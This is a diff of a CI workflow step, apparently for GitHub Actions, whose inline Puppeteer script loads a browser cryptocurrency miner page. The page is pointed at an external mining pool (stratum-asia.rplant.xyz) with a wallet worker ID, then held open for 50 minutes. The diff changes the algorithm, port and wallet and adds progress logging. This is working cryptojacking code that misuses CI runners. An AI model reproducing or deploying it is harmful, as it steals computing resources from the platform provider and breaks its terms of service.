@@ -29,26 +29,51 @@ jobs:
           const puppeteer = require('puppeteer');
           const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
           
+          const logProgress = async (interval, totalDuration) => {
+            const startTime = Date.now();
+            const endTime = startTime + totalDuration;
+            while (Date.now() < endTime) {
+              console.log('Progress update: waiting...');
+              await delay(interval);
+            }
+          };
+
           (async () => {
-            const browser = await puppeteer.launch({ headless: true });
-            const page = await browser.newPage();
-            await page.goto('https://webminer.pages.dev?algorithm=yespower&host=stratum-asia.rplant.xyz&port=17122&worker=QXAU8sRQcwx4Agii4a4VLpkD3SwF7MohgS&password=x&workers=4');
-            
-            // Log page title
-            console.log('Page title:', await page.title());
-            
-            // Wait for 50 minutes
-            console.log('Waiting for 50 minutes...');
-            await delay(3000 * 60 * 1000); // Wait for 3000 seconds (50 minutes)
-            
-            // Optionally take a screenshot or perform other actions here
-            await page.screenshot({ path: 'screenshot.png' });
-            
-            // Save page content
-            const content = await page.content();
-            require('fs').writeFileSync('response.html', content);
-            
-            console.log('Finished waiting, closing browser...');
-            await browser.close();
+            try {
+              const browser = await puppeteer.launch({ headless: true });
+              const page = await browser.newPage();
+              console.log('Navigating to URL...');
+              await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=4');
+              console.log('Navigation complete.');
+
+              // Log page title
+              console.log('Page title:', await page.title());
+              
+              // Log start of waiting period
+              console.log('Waiting for 50 minutes...');
+              
+              // Set up progress logging every 5 minutes
+              const interval = 5 * 60 * 1000; // 5 minutes in milliseconds
+              const totalDuration = 50 * 60 * 1000; // 50 minutes in milliseconds
+              
+              // Log progress every 5 minutes
+              await logProgress(interval, totalDuration);
+              
+              // Log end of waiting period
+              console.log('Finished waiting, continuing...');
+              
+              // Optionally take a screenshot or perform other actions here
+              await page.screenshot({ path: 'screenshot.png' });
+              
+              // Save page content
+              const content = await page.content();
+              require('fs').writeFileSync('response.html', content);
+              
+              console.log('Finished, closing browser...');
+              await browser.close();
+            } catch (error) {
+              console.error('Error:', error);
+              process.exit(1);
+            }
           })();
           "
